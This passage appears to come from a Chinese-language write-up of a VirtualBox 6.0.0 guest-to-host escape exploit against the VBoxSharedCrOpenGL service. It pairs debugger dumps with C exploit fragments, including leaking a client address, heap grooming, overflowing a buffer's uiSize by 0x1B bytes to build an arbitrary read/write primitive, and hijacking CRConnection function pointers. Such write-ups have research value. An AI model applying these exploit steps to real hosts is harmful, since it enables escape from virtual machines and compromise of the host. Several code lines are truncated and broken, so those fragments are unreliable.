    ... ↓        9 skipped
    10:0080│     0x7fb89214f100 ◂— 0x3e8000003e800
    11:0088│     0x7fb89214f108 ◂— 0x0
    12:0090│     0x7fb89214f110 ◂— 0x0
    13:0098│     0x7fb89214f118 ◂— 0x100000000
    14:00a0│     0x7fb89214f120 ◂— 0x0
    ... ↓        2 skipped
    17:00b8│     0x7fb89214f138 ◂— 0x1b58
    18:00c0│     0x7fb89214f140 —▸ 0x7fb8a5cfc00c (crVBoxHGCMAlloc) ◂— push   rbp
    19:00c8│     0x7fb89214f148 —▸ 0x7fb8a5cfcd4e (crVBoxHGCMFree) ◂— push   rbp
    1a:00d0│     0x7fb89214f150 —▸ 0x7fb8a5cfc982 (crVBoxHGCMSend) ◂— push   rbp
    1b:00d8│     0x7fb89214f158 ◂— 0x0
因此这里我们无需用到越界读也能泄露出原来`CRConnection`中的信息，我们泄露出位于`0x248`处的`pClient`地址以后，重新建立了一个新的`VBoxSharedCrOpenGL`服务，以便我们后续劫持该服务中的`CRConnection`中一些函数指针，从而控制程序流程
       uint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);
       //重新将新的CRClient和CRConnection结构体占位与此
       new_client = hgcm_connect("VBoxSharedCrOpenGL");
       LeakClient lc = {
            .new_client = new_client,
            .client_addr = client_addr
       };
       /*for (int i=0;i= UINT32_MAX / sizeof(char *) / 4)
        {
            crError("crUnpackExtendShaderSource: count %u is out of range", count);
            return;
        }
        pos = 20 + count * sizeof(*pLocalLength);
        if (hasNonLocalLen > 0)
        {
            length = DATA_POINTER(pos, GLint);
            pos += count * sizeof(*length);
        }
        pos_check = pos;
        if (!DATA_POINTER_CHECK(pos_check))
        {
            crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
            return;
        }
        for (i = 0; i = INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))
            {
                crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
                return;
            }
            pos_check += pLocalLength[i];
        }
        ppStrings = crAlloc(count * sizeof(char*));
        if (!ppStrings) return;
        for (i = 0; i  0);
            jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
            for (j = 0; j = INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))
            {
                crError("crUnpackExtendShaderSource: pos %d is out of range", pos_check);
                return;
            }
            pos_check += pLocalLength[i];
        }
因为对于最后一次的循环，`pLocalLength[i];`可以为任意大小的值，将其累加到`pos_check`上面以后，就退出了循环，没有再次检查`pos_check`是否还在`DATA_POINTER`范围内。由于上述的检查不充分，下方的循环将导致溢出
            Assert(pLocalLength[i] > 0);
            jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
            for (j = 0; j  x /2gx ppStrings
    0x7fb890f34ed0:    0x00007fb893001fcc    0x00007fb893001fcd
    pwndbg> x /20gx 0x00007fb893001fcd
    0x7fb893001fcd:    0x0000000000123456    0x0000000035000000
    0x7fb893001fdd:    0x3000007b06000000    0xb893002010000000
    0x7fb893001fed:    0xb893001f7000007f    0xb89300205000007f
    0x7fb893001ffd:    0x000000000000007f    0x0000000045000000
    0x7fb89300200d:    0x6161616161000000    0x6161616161616161
    0x7fb89300201d:    0x6262626262626200    0x6300626262626262
    0x7fb89300202d:    0x6363636363636363    0x4364690063636363
    0x7fb89300203d:    0x000000000065696c    0x0000000035000000
    0x7fb89300204d:    0x3000007b07000000    0xb893002080000000
    0x7fb89300205d:    0xb893001fe000007f    0xb8930020c000007f
通过上面调试的数据，可以知道，我们的堆风水已经弄好了，现在就是溢出，修改buf2的`uiSize`，我们先通过调试，确定精确的溢出偏移大小，仅达到修改`uiSize`，保证其后面的数据不被破坏
    In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c
        91         jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];
        92         for (j = 0; j  x /20wx pString+0x3
    0x7fb893001fd0:    0x00000000    0x00000000    0x00000035    0x00000000
    0x7fb893001fe0:    0x00007b06    0x00000030    0x93002010    0x00007fb8
    0x7fb893001ff0:    0x93001f70    0x00007fb8    0x93002050    0x00007fb8
    0x7fb893002000:    0x00000000    0x00000000    0x00000045    0x00000000
    0x7fb893002010:    0x61616161    0x61616161    0x61616161    0x62620061
我们确定出修改`uiSize`需要0x1B的偏移
如图，buf2的`uiSize`已经成功被修改，现在我们就可以利用buf2修改buf3的`CRVBOXSVCBUFFER_t`结构体，构造任意地址读写原语。由于此处的堆是通过glibc申请的，因此当我们修改`uiSize`后，glibc堆chunk的头部也已经损坏，此时调用到`svcFreeBuffer(pSvcBuffer);`时，在glibc2.23环境下，虚拟机会发生崩溃。因此我们在ubuntu
1804上进行测试，由于glibc 2.27有tcache机制，不会检查chunk的size因此可以在glibc
2.27及以上完成利用。当在glibc2.27及以上环境时，我们换一种方式来布置堆风水
       int buf1,buf2,buf3,buf4;
       for (int i=0;iconn->cbHostBuffer > *pcbBuffer)
        {
            crDebug("crServer: [%lx] ClientRead u32ClientID=%d FAIL, host buffer too small %d of %d",
                      crThreadID(), pClient->conn->u32ClientID, *pcbBuffer, pClient->conn->cbHostBuffer);
            /* Return the size of needed buffer */
            *pcbBuffer = pClient->conn->cbHostBuffer;